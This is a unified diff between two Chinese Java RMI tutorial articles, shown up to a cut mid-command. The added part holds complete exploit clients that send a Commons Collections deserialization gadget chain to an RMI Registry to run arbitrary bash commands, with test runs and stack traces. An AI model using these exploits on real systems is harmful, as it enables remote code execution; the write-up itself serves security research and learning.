@@ -1,59 +1,41 @@
-标题: Java RMI入门(4)
+标题: Java RMI入门(6)
 
-创建: 2020-03-19 17:28
-更新: 2020-04-04 17:53
-链接: http://scz.617.cn:8/network/202003191728.txt
+创建: 2020-04-01 16:50
+更新: 2020-04-03 16:45
+链接: http://scz.617.cn:8/network/202004011650.txt
 
 --------------------------------------------------------------------------
 
 目录:
 
     ☆ 前言
-    ☆ CVE-2017-3241详解
-        1) Message.java
-        2) SomeInterface.java
-        3) SomeInterfaceImpl.java
-        4) SomeDynamicServer.java
-        5) SomeNormalClient.java
-        6) 测试正常用法
-        7) sun.rmi.server.UnicastRef.unmarshalValue()
-        8) normal版PublicKnown.java
-        9) fake版PublicKnown.java
-       10) SomeEvilClient.java
-       11) 测试异常用法
-           11.1) PublicKnown.readObject()调用栈回溯
-           11.2) 简化版调用关系
-       12) 关于package的幺蛾子
-           12.1) Message2.java
-           12.2) SomeInterface2.java
-           12.3) SomeInterface2Impl.java
-           12.4) SomeDynamicServer2.java
-           12.5) SomeNormalClient2.java
-           12.6) normal版PublicKnown2.java
-           12.7) fake版PublicKnown2.java
-           12.8) SomeEvilClient2.java
-           12.9) 编译
-          12.10) 测试
-       13) 关于AbstractPlatformTransactionManager的幺蛾子
-           13.1) Message3.java
-           13.2) SomeInterface3.java
-           13.3) SomeInterface3Impl.java
-           13.4) SomeDynamicServer3.java
-           13.5) SomeNormalClient3.java
-           13.6) normal版PublicKnown3.java
-           13.7) fake版PublicKnown3.java
-           13.8) SomeEvilClient3.java
-           13.9) 编译
-          13.10) 测试
-       14) JtaTransactionManager利用链
-           14.1) fake版JtaTransactionManager.java
-           14.2) EvilClientWithJtaTransactionManager.java
-           14.3) 编译
+    ☆ 攻击RMI Registry
+        1) RMIRegistryServer.java
+        2) EvilRMIRegistryClientWithBadAttributeValueExpException.java
+        3) 测试
+        4) 简化版调用关系
+        5) GeneralInvocationHandler3.java
+        6) EvilRMIRegistryClientWithBadAttributeValueExpException3.java
+        7) 测试
+            7.1) 远程测试
+        8) 简化版调用关系(重点看这个)
+        9) ysoserial/RMIRegistryExploit
+       10) sun.rmi.registry.RegistryImpl.checkAccess
+       11) sun.rmi.registry.RegistryImpl_Skel.dispatch
+       12) 8u232为什么失败
+           12.1) sun.rmi.registry.RegistryImpl.registryFilter
+           12.2) sun.rmi.registry.registryFilter属性
+           12.3) java.security文件
+       13) 为什么CommonsCollections5攻击JDK自带rmiregistry失败
+       14) 基于报错回显的PoC
+           14.1) DoSomething.java
+           14.2) RMIRegistryExploitWithHashtable.java
+           14.3) RMIRegistryExploitWithHashtable2.java
            14.4) 测试
-               14.4.1) ExploitObject()调用栈回溯
-               14.4.2) 用rmi-dumpregistry.nse观察周知端口
-               14.4.3) 用marshalsec测试
-       15) 为什么Message3需要继承AbstractPlatformTransactionManager
+               14.4.1) 测试1
+               14.4.2) 测试2(connect shell)
+               14.4.3) 测试3(rmiregistry)
+               14.4.4) 远程测试
     ☆ 参考资源
 
 --------------------------------------------------------------------------
@@ -71,429 +53,1274 @@ http://scz.617.cn:8/network/202003081810.txt
 《Java RMI入门(3)》
 http://scz.617.cn:8/network/202003121717.txt
 
+《Java RMI入门(4)》
+http://scz.617.cn:8/network/202003191728.txt
+
 《Java RMI入门(5)》
 http://scz.617.cn:8/network/202003241127.txt
 
-《Java RMI入门(6)》
-http://scz.617.cn:8/network/202004011650.txt
+本篇讲解1099/TCP周知端口所存在的反序列化漏洞。系列(1)中写过，远程绑定不可
+能成功，对源IP有检查，分离周知端口与动态端口到不同主机的尝试失败。所以第一
+次看到"ysoserial/RMIRegistryExploit"，我是懵X的，它在远程绑定。跟KINGX讨论
+了一下我的困惑，他说对这块也有些迷糊，于是我决定调试一番。由于某些测试用例
+涉及"Commons Collections反序列化漏洞"，就先写了系列(5)。现在开始填系列(6)
+的坑。并未完结，迭代补齐。
 
-☆ CVE-2017-3241详解
+如果从系列(1)追剧一样地追到了系列(6)，应该跟我差不多，开始入门RMI了。
 
-参[47]，中国人的原创漏洞，这个洞很骚包，发现者可以啊。Oracle给了9分，据说
-受影响版本:
+☆ 攻击RMI Registry
 
-<= 6u131
-<= 7u121
-<= 8u112
+本节victim是RMI周知端口，动态端口作为攻击行为的客户端出场。
 
-后面的PoC用到了如下库:
+1) RMIRegistryServer.java
 
-spring-tx-4.2.4.RELEASE.jar
-spring-beans-4.2.4.RELEASE.jar
-spring-core-4.2.4.RELEASE.jar
-javax.transaction-api-1.2.jar
-commons-logging-1.2.jar
-spring-context-4.2.4.RELEASE.jar
+从RMI架构上讲，这是RMI周知端口。
 
-本章记录学习过程中掉进去的那些坑。
-
-1) Message.java
-
---------------------------------------------------------------------------
+```java
 /*
- * javac -encoding GBK -g Message.java
+ * javac -encoding GBK -g RMIRegistryServer.java
+ * java -Djava.rmi.server.hostname=192.168.65.23 RMIRegistryServer 1099
+ */
+import java.rmi.registry.*;
+
+public class RMIRegistryServer
+{
+    public static void main ( String[] argv ) throws Exception
+    {
+        int port    = Integer.parseInt( argv[0] );
+        LocateRegistry.createRegistry( port );
+        System.in.read();
+    }
+}
+```
+
+2) EvilRMIRegistryClientWithBadAttributeValueExpException.java
+
+本例所用攻击链有一部分对应"ysoserial/CommonsCollections5"。
+
+从RMI架构上讲，这是RMI动态端口，参看"8.2) HelloRMIDynamicServer.java"。
+
+```java
+/*
+ * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilRMIRegistryClientWithBadAttributeValueExpException.java
  */
 import java.io.*;
+import java.util.*;
+import java.lang.reflect.*;
+import java.rmi.Remote;
+import java.rmi.registry.*;
+import javax.management.BadAttributeValueExpException;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 
 /*
- * 必须实现Serializable接口
+ * 从EvilClientWithBadAttributeValueExpException.java修改而来
  */
-class Message implements Serializable
+public class EvilRMIRegistryClientWithBadAttributeValueExpException
 {
-    private static final long   serialVersionUID    = 0x5120131473637a00L;
-
-    private String  msg;
-
-    public Message ()
-    {
-    }
-
-    public Message ( String msg )
-    {
-        this.msg    = msg;
-    }
-
-    public String getMsg ()
-    {
-        return( this.msg );
-    }
-
-    public void setMsg ( String msg )
-    {
-        this.msg    = msg;
-    }
-}
---------------------------------------------------------------------------
-
-2) SomeInterface.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeInterface.java
- */
-import java.rmi.*;
-
-public interface SomeInterface extends Remote
-{
-    /*
-     * Echo形参是Object，不是Primitive类型
-     */
-    public String Echo ( Message sth ) throws RemoteException;
-}
---------------------------------------------------------------------------
-
-为了演示CVE-2017-3241，Echo()形参类型必须是Object或其子类，不能是Primitive
-类型，这样才有机会触发反序列化操作。Message就是一种Object类型。
-
-String也是一种Object，java.lang.String是这么定义的:
-
-public final class String implements Serializable, Comparable<String>, CharSequence
-
-但对于CVE-2017-3241来说，如果Echo()形参是String类型，无法攻击它。String有
-final修饰符，无法自定义一个类去继承String，否则编译报错:
-
-cannot inherit from final String
-
-攻击跟继承有何关系？后面会解释。
-
-上面关于String的讨论是我初次接触CVE-2017-3241时的无知讨论，是错误的。后面
-会在"CVE-2017-3241进阶"中演示如何攻击Echo()形参是String类型时的情形。也就
-是说，不需要弄个Message类型出来。
-
-3) SomeInterfaceImpl.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeInterfaceImpl.java
- */
-import java.rmi.RemoteException;
-import java.rmi.server.UnicastRemoteObject;
-
-public class SomeInterfaceImpl extends UnicastRemoteObject implements SomeInterface
-{
-    /*
-     * 跟Message的不同
-     */
-    private static final long   serialVersionUID    = 0x5120131473637a01L;
-
-    protected SomeInterfaceImpl () throws RemoteException
-    {
-        super();
-    }
-
-    @Override
-    public String Echo ( Message sth ) throws RemoteException
-    {
-        return( "[" + sth.getMsg() + "]" );
-    }
-}
---------------------------------------------------------------------------
-
-4) SomeDynamicServer.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeDynamicServer.java
- */
-import javax.naming.*;
-
-/*
- * Dynamic是强调这里只有动态端口部分，周知端口部分被分离了
- */
-public class SomeDynamicServer
-{
+    @SuppressWarnings("unchecked")
     public static void main ( String[] argv ) throws Exception
     {
-        String          name    = argv[0];
+        String          addr        = argv[0];
+        int             port        = Integer.parseInt( argv[1] );
+        String          cmd         = argv[2];
+        Transformer[]   tarray      = new Transformer[]
+        {
+            new ConstantTransformer( Runtime.class ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "getRuntime",
+                    new Class[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "exec",
+                new Class[]
+                {
+                    String[].class
+                },
+                new Object[]
+                {
+                    new String[]
+                    {
+                        "/bin/bash",
+                        "-c",
+                        cmd
+                    }
+                }
+            )
+        };
+        Transformer     tchain      = new ChainedTransformer( tarray );
+        Map             normalMap   = new HashMap();
+        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
+        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
+        BadAttributeValueExpException
+                        bave        = new BadAttributeValueExpException( null );
+        Field           f           = bave.getClass().getDeclaredField( "val" );
+        f.setAccessible( true );
+        f.set( bave, tme );
         /*
-         * 保持一般性，使用JNDI，用JVM参数传递env
+         * 前面在准备待序列化数据，后面是一种另类的序列化过程
          */
-        Context         ctx     = new InitialContext();
-        SomeInterface   some    = new SomeInterfaceImpl();
-        ctx.rebind( name, some );
+        String          name        = "anything";
+        HashMap         hm          = new HashMap();
+        hm.put( name, bave );
+        Class           clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
+        Constructor     cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
+        cons.setAccessible( true );
+        InvocationHandler
+                        ih          = ( InvocationHandler )cons.newInstance( Override.class, hm );
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/rmi/Remote.html
+         *
+         * Remote是个接口，因此可以使用动态代理机制。参看:
+         *
+         * http://scz.617.cn/misc/201911291425.txt
+         *
+         * 2.2) TicketServiceClient1.java
+         */
+        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
+        (
+            Remote.class.getClassLoader(),
+            new  Class[] { Remote.class },
+            ih
+        );
+        Registry        r           = LocateRegistry.getRegistry( addr, port );
+        /*
+         * 通过远程绑定触发"RMI Registry"的反序列化漏洞
+         */
+        r.rebind( name, remoteProxy );
     }
 }
---------------------------------------------------------------------------
+```
 
-5) SomeNormalClient.java
+与HelloRMIDynamicServer不同，本例r.rebind()不会形成阻塞。
 
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeNormalClient.java
- */
-import javax.naming.*;
+3) 测试
 
-public class SomeNormalClient
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        /*
-         * 保持一般性，使用JNDI，用JVM参数传递env
-         */
-        Context         ctx     = new InitialContext();
-        SomeInterface   some    = ( SomeInterface )ctx.lookup( name );
-        String          resp    = some.Echo( new Message( sth ) );
-        System.out.println( resp );
-    }
-}
---------------------------------------------------------------------------
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
-6) 测试正常用法
-
-假设目录结构是:
-
-.
-|
-+---test1
-|       SomeDynamicServer.class
-|       SomeInterface.class
-|       SomeInterfaceImpl.class
-|       Message.class
-|
-\---test2
-        SomeNormalClient.class
-        SomeInterface.class
-        Message.class
-
-在test1目录执行:
-
-rmiregistry 1099
+8u232不能得手，8u40可以。
 
 java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer any
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
 
-为了聚焦CVE-2017-3241，在SomeDynamicServer所在目录执行rmiregistry，减少麻
-烦。
+调试RMIRegistryServer:
 
-在test2目录执行:
-
-java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeNormalClient any "msg from client"
-
-7) sun.rmi.server.UnicastRef.unmarshalValue()
-
-参:
-
-http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastRef.java
-
---------------------------------------------------------------------------
-/**
- * Unmarshal value from an ObjectInput source using RMI's serialization
- * format for parameters or return values.
- */
-protected static Object unmarshalValue(Class<?> type, ObjectInput in)
-    throws IOException, ClassNotFoundException
-{
-    if (type.isPrimitive()) {
-        if (type == int.class) {
-            return Integer.valueOf(in.readInt());
-        } else if (type == boolean.class) {
-            return Boolean.valueOf(in.readBoolean());
-        } else if (type == byte.class) {
-            return Byte.valueOf(in.readByte());
-        } else if (type == char.class) {
-            return Character.valueOf(in.readChar());
-        } else if (type == short.class) {
-            return Short.valueOf(in.readShort());
-        } else if (type == long.class) {
-            return Long.valueOf(in.readLong());
-        } else if (type == float.class) {
-            return Float.valueOf(in.readFloat());
-        } else if (type == double.class) {
-            return Double.valueOf(in.readDouble());
-        } else {
-            throw new Error("Unrecognized primitive type: " + type);
-        }
-    } else {
-        /*
-         * 322行。jfeiyi在CVE-2017-3241中指出，如果RMI远程接口中的函数形参
-         * 类型是Object，服务端流程会经过此处。
-         */
-        return in.readObject();
-    }
-}
---------------------------------------------------------------------------
-
-Echo()的形参类型是Object，理论上服务端流程会经过前述322行。调试服务端:
-
-java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer any
+java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
 jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
 
-stop in sun.rmi.server.UnicastRef.unmarshalValue
-stop at sun.rmi.server.UnicastRef:322
+stop in java.lang.Runtime.exec(java.lang.String[])
 
-  [1] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 170
-  [2] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
-  [3] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
-  [4] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
-  [5] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
-  [6] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
-  [7] java.security.AccessController.doPrivileged (native method)
-  [8] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
-  [9] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
-  [10] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
-  [11] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
-  [12] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.1302121069.run (null), pc = 4
-  [13] java.security.AccessController.doPrivileged (native method)
-  [14] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
-  [15] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
-  [16] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
-  [17] java.lang.Thread.run (Thread.java:748), pc = 11
+  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
+  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
+  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
+  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
+  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
+  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:131), pc = 20
+  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
+  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
+  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
+  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
+  [21] java.util.HashMap.readObject (HashMap.java:1,396), pc = 225
+  [22] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [23] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [24] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [25] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [26] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
+  [27] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
+  [28] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [29] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [30] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
+  [31] java.io.ObjectInputStream.defaultReadObject (ObjectInputStream.java:501), pc = 41
+  [32] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:428), pc = 1
+  [33] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [34] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [35] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [36] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [37] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
+  [38] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
+  [39] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [40] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [41] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
+  [42] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
+  [43] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [44] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [45] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
+  [46] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 370
+  [47] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
+  [48] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
+  [49] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [50] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [51] java.security.AccessController.doPrivileged (native method)
+  [52] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [53] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
+  [54] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
+  [55] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
+  [56] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.2050827014.run (null), pc = 4
+  [57] java.security.AccessController.doPrivileged (native method)
+  [58] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
+  [59] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
+  [60] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
+  [61] java.lang.Thread.run (Thread.java:745), pc = 11
 
-8) normal版PublicKnown.java
+这个调用栈回溯实在太深了。
+
+4) 简化版调用关系
 
 --------------------------------------------------------------------------
+TCPTransport.handleMessages
+  Transport.serviceCall
+    UnicastServerRef.dispatch
+      UnicastServerRef.oldDispatch
+        RegistryImpl_Skel.dispatch
+          ObjectInputStream.readObject
+            AnnotationInvocationHandler.readObject              // 通过remoteProxy与这个类产生关联
+              ObjectInputStream.defaultReadObject               // 跟AnnotationInvocationHandler.invoke没关系
+                HashMap.readObject                              // 对应客户端的hm变量
+                  ObjectInputStream.readObject
+                    BadAttributeValueExpException.readObject    // ysoserial/CommonsCollections5
+                                                                // 对应客户端的bave变量
+                      TiedMapEntry.toString
+                        TiedMapEntry.getValue
+                          LazyMap.get                           // 此处开始LazyMap利用链
+                            ChainedTransformer.transform
+                              InvokerTransformer.transform
+--------------------------------------------------------------------------
+
+5) GeneralInvocationHandler3.java
+
+参[57]，作者指出攻击端可以不用AnnotationInvocationHandler，而是自己实现一
+个InvocationHandler。
+
+参看:
+
+《Java设计模式之代理模式》
+http://scz.617.cn/misc/201911291425.txt
+
+```java
 /*
- * javac -encoding GBK -g PublicKnown.java
+ * javac -encoding GBK -g GeneralInvocationHandler3.java
  */
 import java.io.*;
+import java.lang.reflect.*;
 
 /*
- * 假设这是在服务端正常存在且位于CLASSPATH中的类
+ * 从GeneralInvocationHandler.java修改而来，多实现一个接口Serializable
+ *
+ * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/InvocationHandler.html
+ *
+ * InvocationHandler is the interface implemented by the invocation
+ * handler of a proxy instance. Each proxy instance has an associated
+ * invocation handler. When a method is invoked on a proxy instance, the
+ * method invocation is encoded and dispatched to the invoke method of its
+ * invocation handler.
  */
-public class PublicKnown implements Serializable
+public class GeneralInvocationHandler3 implements InvocationHandler, Serializable
 {
-    /*
-     * 与Message、SomeInterfaceImpl不同
-     */
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
+    private Object  realobj;
+
+    public GeneralInvocationHandler3 ( Object realobj )
+    {
+        this.realobj    = realobj;
+    }
 
     /*
-     * 所找PublicKnown必须有实现这个函数，否则无法利用CVE-2017-3241漏洞
+     * This method will be invoked on an invocation handler when a method
+     * is invoked on a proxy instance that it is associated with.
      */
-    private void readObject ( ObjectInputStream ois )
-        throws IOException, ClassNotFoundException
+    @Override
+    public Object invoke ( Object proxy, Method method, Object[] args ) throws Throwable
     {
-        System.out.println( "PublicKnown.readObject()" );
-        ois.defaultReadObject();
+        /*
+         * 转发至目标对象
+         */
+        Object  obj = method.invoke( realobj, args );
+        return( obj );
     }
 }
---------------------------------------------------------------------------
+```
 
-看过不少讲这种传统Java反序列化的文章会说"覆写readObject"，或者
-"重载readObject"。这得喷一段，PublicKnown.readObject()与
-ObjectInputStream.readObject()函数原型不一样，二者之间不存在继承重载或实现
-接口之类的关系，只不过函数名一样罢了。不存在所谓覆写重载，这只是个约定好的
-magic机制，没见PublicKnown.readObject()是private的吗。有人纠正过这事，架不
-住一代代SB前赴后继抄来抄去啊。
+6) EvilRMIRegistryClientWithBadAttributeValueExpException3.java
 
-9) fake版PublicKnown.java
+从RMI架构上讲，这是RMI动态端口。
 
---------------------------------------------------------------------------
+```java
 /*
- * javac -encoding GBK -g PublicKnown.java
+ * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." EvilRMIRegistryClientWithBadAttributeValueExpException3.java
  */
+import java.io.*;
+import java.util.*;
+import java.lang.reflect.*;
+import java.rmi.Remote;
+import java.rmi.registry.*;
+import javax.management.BadAttributeValueExpException;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 
 /*
- * 这是fake版PublicKnown，不会出现在服务端，只在恶意客户端存在
+ * 从EvilRMIRegistryClientWithBadAttributeValueExpException.java修改而来
  */
-public class PublicKnown extends Message
+public class EvilRMIRegistryClientWithBadAttributeValueExpException3
 {
-    /*
-     * fake版与normal版该值必须相同
-     */
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
-}
---------------------------------------------------------------------------
-
-10) SomeEvilClient.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeEvilClient.java
- */
-import javax.naming.*;
-
-public class SomeEvilClient
-{
+    @SuppressWarnings("unchecked")
     public static void main ( String[] argv ) throws Exception
     {
-        String          name    = argv[0];
-        String          sth     = argv[1];
+        String          addr        = argv[0];
+        int             port        = Integer.parseInt( argv[1] );
+        String          cmd         = argv[2];
+        Transformer[]   tarray      = new Transformer[]
+        {
+            new ConstantTransformer( Runtime.class ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "getRuntime",
+                    new Class[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[0]
+                }
+            ),
+            new InvokerTransformer
+            (
+                "exec",
+                new Class[]
+                {
+                    String[].class
+                },
+                new Object[]
+                {
+                    new String[]
+                    {
+                        "/bin/bash",
+                        "-c",
+                        cmd
+                    }
+                }
+            )
+        };
+        Transformer     tchain      = new ChainedTransformer( tarray );
+        Map             normalMap   = new HashMap();
+        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
+        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
+        BadAttributeValueExpException
+                        bave        = new BadAttributeValueExpException( null );
+        Field           f           = bave.getClass().getDeclaredField( "val" );
+        f.setAccessible( true );
+        f.set( bave, tme );
         /*
-         * 保持一般性，使用JNDI，用JVM参数传递env
+         * 前面在准备待序列化数据，后面是一种另类的序列化过程
          */
-        Context         ctx     = new InitialContext();
-        SomeInterface   some    = ( SomeInterface )ctx.lookup( name );
+        String          name        = "anything";
+        GeneralInvocationHandler3
+                        ih          = new GeneralInvocationHandler3( bave );
         /*
-         * 使用fake版PublicKnown
+         * https://docs.oracle.com/javase/8/docs/api/java/rmi/Remote.html
+         *
+         * Remote是个接口，因此可以使用动态代理机制。参看:
+         *
+         * http://scz.617.cn/misc/201911291425.txt
+         *
+         * 2.2) TicketServiceClient1.java
          */
-        PublicKnown     p       = new PublicKnown();
-        p.setMsg( sth );
-        String          resp    = some.Echo( p );
-        System.out.println( resp );
+        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
+        (
+            Remote.class.getClassLoader(),
+            new  Class[] { Remote.class },
+            ih
+        );
+        Registry        r           = LocateRegistry.getRegistry( addr, port );
+        /*
+         * 通过远程绑定触发"RMI Registry"的反序列化漏洞
+         */
+        r.rebind( name, remoteProxy );
     }
 }
---------------------------------------------------------------------------
+```
 
-fake版PublicKnown继承Message，然后在SomeEvilClient中使用fake版PublicKnown。
-这样客户端就能通知服务端，我有使用PublicKnown，你丫赶紧找PublicKnown来？什
-么，上哪找？当然在服务端的CLASSPATH中找啊。
-
-fake版PublicKnown只起一个通知作用，只用到了名字和serialVersionUID，因此并
-不需要其他复杂实现。
-
-11) 测试异常用法
+7) 测试
 
 假设目录结构是:
-
 .
 |
-+---test1
-|       SomeDynamicServer.class
-|       SomeInterface.class
-|       SomeInterfaceImpl.class
-|       Message.class
-|       PublicKnown.class (normal版)
++---test2
+|       RMIRegistryServer.class
+|       commons-collections-3.1.jar
 |
-\---test2
-        SomeEvilClient.class
-        SomeInterface.class
-        Message.class
-        PublicKnown.class (fake版)
+\---test3
+        EvilRMIRegistryClientWithBadAttributeValueExpException3.class
+        GeneralInvocationHandler3.class
+        commons-collections-3.1.jar
 
-在test1目录执行:
+为接近现实世界，test2目录下没有GeneralInvocationHandler3.class。
 
-rmiregistry 1099
+在test2目录执行:
+
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在test3目录执行:
 
 java \
